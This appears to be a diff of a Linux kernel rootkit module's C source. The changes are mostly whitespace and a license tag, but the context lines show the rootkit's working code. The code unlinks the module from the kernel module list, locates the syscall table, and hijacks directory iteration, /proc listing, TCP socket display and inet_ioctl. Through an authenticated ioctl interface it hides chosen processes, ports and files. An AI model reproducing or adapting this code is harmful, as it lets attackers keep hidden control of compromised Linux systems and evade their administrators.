@@ -14,7 +14,7 @@
 #include <linux/version.h>
 #include <linux/kernel.h>
 #if (LINUX_VERSION_CODE > KERNEL_VERSION(2, 6, 20))
-	#include <linux/cred.h>
+    #include <linux/cred.h>
 #endif
 #include <linux/capability.h>
 #include <asm/uaccess.h>
@@ -59,17 +59,17 @@ static int (*root_iterate)(struct file *file, struct dir_context *);
 
 unsigned long *sys_call_table;
 
-#define HIDE_PROC		1
-#define UNHIDE_PROC		2
-#define HIDE_TCP		3
-#define UNHIDE_TCP		4
-#define HIDE_FILE		5
-#define UNHIDE_FILE		6
+#define HIDE_PROC       1
+#define UNHIDE_PROC     2
+#define HIDE_TCP        3
+#define UNHIDE_TCP      4
+#define HIDE_FILE       5
+#define UNHIDE_FILE     6
 struct rk_args 
 {
     unsigned short cmd;
-	unsigned int args_len;
-	char args[512];
+    unsigned int args_len;
+    char args[512];
 }__attribute__((__packed__));
 
 struct hidden_port {
@@ -171,7 +171,7 @@ static void *get_vfs_iterate(const char *path)
 
     ret = filep->f_op->ITERATE_NAME;
     
-	filp_close(filep, 0);
+    filp_close(filep, 0);
 
     return ret;
 }
@@ -204,15 +204,15 @@ static void *get_tcp_seq_show(const char *path)
     afinfo = PDE(filep->f_dentry->d_inode)->data;
     #elif (LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0))
     afinfo = PDE_DATA(filep->f_dentry->d_inode);
-	#else
+    #else
     afinfo = PDE_DATA(filep->f_path.dentry->d_inode);
     #endif
     
-	#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
+    #if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
     ret = afinfo->seq_show;
-	#else 
+    #else 
     ret = afinfo->seq_ops.show;
-	#endif
+    #endif
 
     filp_close(filep, 0);
 
@@ -327,7 +327,7 @@ static int new_root_filldir(void *__buf, const char *name, int namelen, loff_t o
     list_for_each_entry ( hf, &hidden_files, list ) {
         if (!strcmp(name, hf->name) )
             return 0;
-	}	
+    }   
 
     return root_filldir(__buf, name, namelen, offset, ino, d_type);
 }
@@ -356,7 +356,7 @@ static int new_proc_filldir(void *__buf, const char *name, int namelen, loff_t o
     list_for_each_entry ( hp, &hidden_procs, list ) {
         if ( pid == hp->pid )
             return 0;
-	}
+    }
 
     return proc_filldir(__buf, name, namelen, offset, ino, d_type);
 }
@@ -380,7 +380,7 @@ static long new_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long 
     struct rk_args rk_args;
     unsigned short pid;
     unsigned short port;
-	char *file_name;
+    char *file_name;
 
     if(cmd == AUTH_TOKEN)
     {
@@ -392,35 +392,35 @@ static long new_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long 
 
         switch (rk_args.cmd)
         {
-      	case HIDE_PROC:
-			pid = (unsigned short)simple_strtoul(rk_args.args, NULL, 0);
+        case HIDE_PROC:
+            pid = (unsigned short)simple_strtoul(rk_args.args, NULL, 0);
             DEBUG("Hiding process with PID %hu\n", pid);
             hide_proc(pid);
             break;
-      	
-		case UNHIDE_PROC:
-			pid = (unsigned short)simple_strtoul(rk_args.args, NULL, 0);
+        
+        case UNHIDE_PROC:
+            pid = (unsigned short)simple_strtoul(rk_args.args, NULL, 0);
             DEBUG("Unhiding process with PID %hu\n", pid);
             unhide_proc(pid);
-        	break;
+            break;
 
-		case HIDE_TCP:
-			port = (unsigned short)simple_strtoul(rk_args.args, NULL, 0);
+        case HIDE_TCP:
+            port = (unsigned short)simple_strtoul(rk_args.args, NULL, 0);
             DEBUG("Hiding TCP connection with port %hu\n", port);
             hide_tcp4_port(port);
-			break;
+            break;
 
-		case UNHIDE_TCP:
-			port = (unsigned short)simple_strtoul(rk_args.args, NULL, 0);
+        case UNHIDE_TCP:
+            port = (unsigned short)simple_strtoul(rk_args.args, NULL, 0);
             DEBUG("Unhiding TCP connection with port %hu\n", port);
             unhide_tcp4_port(port);
-			break;
+            break;
 
         case HIDE_FILE:
             file_name = kmalloc(rk_args.args_len + 1, GFP_KERNEL);
             if(!file_name)
-            	return 0;
-			memcpy(file_name, rk_args.args, rk_args.args_len);
+                return 0;
+            memcpy(file_name, rk_args.args, rk_args.args_len);
 
             DEBUG("Hiding file/directory with name %s\n", rk_args.args);
             hide_file(file_name);
@@ -431,7 +431,7 @@ static long new_inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long 
             unhide_file(rk_args.args);
             break;
         
-		default:
+        default:
             break;
         }
 
@@ -449,11 +449,11 @@ static int __init rootkit_init( void )
 {
     list_del_init(&__this_module.list);
 
-	#if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
+    #if (LINUX_VERSION_CODE < KERNEL_VERSION(2, 6, 20))
     kobject_del(__this_module.mkobj.kobj.parent);
-   	#else 
-	kobject_del(__this_module.holders_dir->parent);
-	#endif
+    #else 
+    kobject_del(__this_module.holders_dir->parent);
+    #endif
 
     sys_call_table = find_sys_call_table();
 
@@ -471,14 +471,14 @@ static int __init rootkit_init( void )
     inet_ioctl = get_inet_ioctl(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     hijack_start(inet_ioctl, &new_inet_ioctl);
 
-	nf_hook_init();
+    nf_hook_init();
 
     return 0;
 }
 
 static void __exit rootkit_cleanup( void )
 {
-	nf_hook_cleanup();
+    nf_hook_cleanup();
     hijack_stop(inet_ioctl);
     hijack_stop(tcp4_seq_show);
     hijack_stop(root_iterate);
@@ -488,4 +488,4 @@ static void __exit rootkit_cleanup( void )
 module_init(rootkit_init);
 module_exit(rootkit_cleanup);
 
-MODULE_LICENSE("GPL");
+MODULE_LICENSE("GPLv2");
